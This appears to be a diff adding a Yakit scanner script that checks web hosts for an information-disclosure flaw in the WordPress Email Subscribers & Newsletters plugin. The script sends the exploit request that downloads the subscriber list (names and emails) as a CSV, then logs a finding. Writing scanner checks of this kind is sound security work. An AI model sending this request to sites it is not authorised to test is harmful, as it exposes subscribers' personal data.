@@ -1,0 +1,58 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="WordPress Email Subscribers & Newsletters 信息泄露漏洞"
+    severity=""
+    type=""
+
+    poc_url_r0= url + `/wp-admin/admin.php?page=download_report&report=users&status=all`
+    req_r0, _ := http.NewRequest("GET",poc_url_r0,
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r0)
+    resp_r0, _ := http.Do(req_r0)
+    bresp,_=http.dump(resp_r0)
+    header, body = poc.Split(bresp)
+    r0_flag = false
+    if resp_r0.StatusCode == 200 && str.Contains(string(body),"Name,Email,Status,Created") &&  re.Match(`(?i)filename=.*?.csv`,string(resp_r0.Header["Content-Disposition"])){
+	r0_flag = true
+    }
+
+    poc_url=poc_url_r0
+    if r0_flag{
+	vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v", type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v", type)),
+                risk.titleVerbose(sprintf("%v", reference)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
